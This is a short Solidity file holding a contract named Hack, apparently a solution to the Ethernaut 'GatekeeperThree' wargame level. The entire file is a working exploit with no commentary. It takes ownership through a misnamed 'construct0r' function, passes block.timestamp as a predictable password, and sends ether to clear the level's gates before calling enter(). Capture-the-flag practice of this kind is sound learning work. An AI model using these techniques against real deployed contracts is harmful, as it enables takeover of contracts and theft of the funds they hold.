// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function getAllowance(uint _password) external;
    function createTrick() external;
    function enter() external;
}

contract Hack {
    function pwn(IGatekeeperThree target) external payable {
        target.construct0r();
        uint password = block.timestamp;
        target.createTrick();
        target.getAllowance(password);
        (bool sent, ) = address(target).call{value: msg.value}("");
        require(sent);

        target.enter();
    }
}